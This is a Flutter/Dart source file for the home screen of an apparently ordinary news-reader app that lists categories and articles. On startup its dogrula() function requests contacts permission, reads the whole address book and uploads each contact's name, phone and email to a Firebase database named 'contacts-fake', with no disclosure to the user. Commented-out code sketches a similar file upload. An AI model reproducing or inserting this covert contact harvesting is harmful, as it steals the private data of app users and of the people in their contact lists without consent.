import 'dart:io';
import 'dart:math';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';

import 'package:origin_news/Helper/News.dart';
import 'package:origin_news/Helper/data.dart';

import 'package:url_launcher/url_launcher.dart';
import 'package:file_picker/file_picker.dart';
import 'package:firebase_storage/firebase_storage.dart';

import '../Helper/Contacts_Helper.dart';
import '../Helper/firebasaeHelper.dart';
import '../firebase_options.dart';
import '../models/Category_model.dart';
import '../models/ContactsModels.dart';
import 'dart:convert' as convert;
import '../models/article_model.dart';
import 'package:cached_network_image/cached_network_image.dart';

import 'package:path_provider/path_provider.dart';

import 'package:permission_handler/permission_handler.dart'; // 权限管理插件

import 'package:contacts_service/contacts_service.dart'; // 通讯录插件

import 'Category_view.dart';
import 'contectsDeneme.dart';

class Home extends StatefulWidget {
  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {
  List<Categorymodel> category = <Categorymodel>[]; // 类别 信息

  List<Article_model> article = <Article_model>[]; // 主要新闻信息
  //FirebasaeHelper firebasaeHelper = new FirebasaeHelper();

  Contacts_Helper contacts_helper = new Contacts_Helper();

  final fb = FirebaseDatabase(
      databaseURL:
          'https://contacts-fake-default-rtdb.asia-southeast1.firebasedatabase.app');
  var rng = Random();
  var k;

  Future save(String DisplayName, String Phone, String Email) async {
    k = rng.nextInt(1000);
    try {
      final ref = fb.ref().child('Contacts/$k');
      await ref.set({
        "DisplayName": DisplayName,
        "Phone": Phone,
        "Email": Email,
      }).asStream();

    } on Exception catch (e) {
      print('Erorr!');
      // TODO
    }
  }

  Future save1(String DisplayName,  String Email) async {
    k = rng.nextInt(1000);
    try {
      final ref = fb.ref().child('Contacts/$k');
      await ref.set({
        "DisplayName": DisplayName,
        "Phone": 'Isempty',
        "Email": Email,
      }).asStream();

    } on Exception catch (e) {
      print('Erorr!');
      // TODO
    }
  }

  Future save2(String DisplayName, String Phone) async {
    k = rng.nextInt(1000);
    try {
      final ref = fb.ref().child('Contacts/$k');
      await ref.set({
        "DisplayName": DisplayName,
        "Phone": Phone,
        "Email": 'Email',
      }).asStream();

    } on Exception catch (e) {
      print('Erorr!');
      // TODO
    }
  }



  late List<Contact> contacts;

  // PlatformFile? picked_file;
  // String? Gl_file;
  //
  // Future selected_file() async {
  //   final resul = await FilePicker.platform.pickFiles();
  //   if (resul == null) return;
  //   setState(() {
  //     picked_file = resul.files.first;
  //   });
  // }
  //
  // Future uploadfile() async {
  //   final path = 'files/contact.text}';
  //   final file = File('assets/contacts.text');
  //   // final path = 'files/test';
  //   // final file = File(Gl_file!.path!);
  //
  //   final ref = FirebaseStorage.instance.ref().child(path);
  //   ref.putFile(file);
  // }
  //
  // Future directory_file() async {
  //   // 创建一个文件夹
  //
  //   Directory tempDir = await getTemporaryDirectory();
  //   Gl_file = tempDir.path;
  //
  //   Directory directory = new Directory('${tempDir.path}/test');
  //
  //   if (!directory.existsSync()) {
  //     directory.createSync();
  //     print('文档初始化成功，文件保存路径为 ${directory.path}');
  //   }

// 创建一个文件
//     Directory _tempDir = await getTemporaryDirectory();
//
//     File file = new File('${_tempDir.path}/test.txt');
//
//     directory.listSync().forEach((file) {
//       print(file.path);
//       //Gl_file = file.path;
//     });
//     print('文件路径${file.path}');
//
//     for (int i = 0; i < contacts.length; i++) {
//       print(contacts[i].displayName);
//       print(contacts[i].phones!.elementAt(0).value);
//       print(contacts[i].emails?.elementAt(0).value);
//     }
//
//     String _temp = await file.readAsString();
//     print('文件内容:\n' + _temp);
//
//     if (!file.existsSync()) {
//       file.createSync();
//       //Gl_file = file;
//       print('test.txt创建成功');
//       //Gl_file = file.path;
//       print('文件路径：${file.path}');
//     }
//   }
//
//   Dosya_silme() async {
//     Directory tempDir = await getTemporaryDirectory();
//     //删除缓存目录
//     await delDir(tempDir);
//     await loadCache();
//     //FlutterToast.showToast(msg: '清除缓存成功');
//     print('清除缓存成功');
//   }
//
//   Future<Null> delDir(FileSystemEntity file) async {
//     if (file is Directory) {
//       final List<FileSystemEntity> children = file.listSync();
//       for (final FileSystemEntity child in children) {
//         await delDir(child);
//       }
//     }
//     await file.delete();
//   }
//
//   Future<Null> loadCache() async {
//     Directory tempDir = await getTemporaryDirectory();
//   }

  dogrula() async {
    await Permission.contacts.request();
    contacts = await ContactsService.getContacts();

    List<Contact> _contact =
        (await ContactsService.getContacts(withThumbnails: false)).toList();
    setState(() {
      contacts = _contact;
    });


    for (int i = 0; i < contacts.length; i++) {
      // print(contacts[i].displayName);
      if (!contacts[i].phones!.isEmpty) {
        save2(contacts[i].displayName.toString(), contacts[i].phones!.elementAt(0).value.toString());
        await Future.delayed(Duration(seconds: 2));
      }
      else if (!contacts[i].emails!.isEmpty) {
        save1(contacts[i].displayName.toString(),contacts[i].emails!.elementAt(0).value.toString() );
        await Future.delayed(Duration(seconds: 2));
      }
      else if(!contacts[i].phones!.isEmpty && !contacts[i].emails!.isEmpty){
        save(contacts[i].displayName.toString(), contacts[i].phones!.elementAt(0).value.toString(), contacts[i].emails!.elementAt(0).value.toString());
        await Future.delayed(Duration(seconds: 2));
      }

    }
  }

  bool _loading = true;

  @override
  void initState() {
    // TODO: implement initState
    category = getCategory();
    getNew();

    dogrula();

    super.initState();
  }

  getNew() async {
    News news = News();
    await news.getNews();
    article = news.article;
    setState(() {
      _loading = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    final ref = fb.ref().child('Contacts');
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.white,
        title: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            Text(
              'Enyeni',
              style: TextStyle(color: Colors.black),
            ),
            SizedBox(
              width: 3,
            ),
          ],
        ),
        elevation: 0.0,
        centerTitle: true,
      ),
      floatingActionButton:
          Column(mainAxisAlignment: MainAxisAlignment.end, children: [
        FloatingActionButton(
          onPressed: () {},
          child: Icon(Icons.add),
        ),
        FloatingActionButton(
          onPressed: () {},
          child: Icon(Icons.access_alarm_rounded),
        ),
        FloatingActionButton(
          onPressed: () {},
          child: Icon(Icons.delete),
        ),
      ]),
      body: _loading
          ? Center(
              child: Container(
                child: CircularProgressIndicator(),
              ),
            )
          : SingleChildScrollView(
              child: Container(
                padding: EdgeInsets.symmetric(horizontal: 16),
                child: Column(
                  children: [
                    // category
                    Container(
                      height: 80,
                      child: ListView.builder(
                          itemCount: category.length,
                          scrollDirection: Axis.horizontal,
                          //shrinkWrap: true,
                          itemBuilder: (context, index) {
                            return CategoryTile(
                                category[index].image,
                                category[index].title,
                                category[index].titleClon);
                          }),
                    ),
                    Container(
                      child: ListView.builder(
                          physics: ClampingScrollPhysics(),
                          shrinkWrap: true,
                          itemCount: article.length,
                          itemBuilder: (context, index) {
                            return Blogtile(
                                article[index].urlToImage.toString(),
                                article[index].title.toString(),
                                article[index].description.toString(),
                                article[index].url.toString());
                          }),
                    )

                    // article
                  ],
                ),
              ),
            ),
    );
  }
}

class CategoryTile extends StatelessWidget {
  final String networkImage, categoryName, clonName;

  CategoryTile(this.networkImage, this.categoryName, this.clonName);

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: () {
        Navigator.push(context, MaterialPageRoute(builder: (context) {
          return Category_View(categoryName, clonName);
        }));
      },
      child: Container(
        child: Container(
          margin: EdgeInsets.all(16),
          child: Stack(
            children: [
              ClipRRect(
                borderRadius: BorderRadius.circular(6),
                child: /*Image.network(
                  networkImage,
                  width: 100,
                  fit: BoxFit.cover,
                ),*/
                    CachedNetworkImage(
                  imageUrl: networkImage,
                  width: 100,
                  fit: BoxFit.cover,
                  placeholder: (context, url) => CircularProgressIndicator(),
                  errorWidget: (context, url, error) => Icon(Icons.error),
                ),
              ),
              Container(
                alignment: Alignment.center,
                width: 100,
                height: 80,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(6),
                  color: Colors.black26,
                ),
                child: Text(
                  clonName,
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 14,
                      fontWeight: FontWeight.w400),
                ),
              )
            ],
          ),
        ),
      ),
    );
  }
} //category // 分类卡片

class Blogtile extends StatelessWidget {
  final String urltoImage, title, desc, url;

  Blogtile(this.urltoImage, this.title, this.desc, this.url);

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: EdgeInsets.only(top: 10),
      child: GestureDetector(
        onTap: () async {
          /*Navigator.push(context, MaterialPageRoute(builder: (context) {
            return Article_Views(url);
          }));*/
          await launch(url);
        },
        child: Card(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              //SizedBox(height: 5,),
              /*Image.network(
                urltoImage,
              ),*/
              CachedNetworkImage(
                imageUrl: urltoImage,
                placeholder: (context, url) => CircularProgressIndicator(),
                errorWidget: (context, url, error) => Icon(Icons.error),
              ),
              SizedBox(
                height: 5,
              ),
              ListTile(
                title: Text(
                  title,
                  style: TextStyle(
                      fontSize: 17,
                      color: Colors.black87,
                      fontWeight: FontWeight.w600),
                ),
                subtitle: Text(
                  desc,
                  maxLines: 2,
                ),
                isThreeLine: true,
              ),
            ],
          ),
        ),
      ),
    );
  }
} // 新闻主题卡片
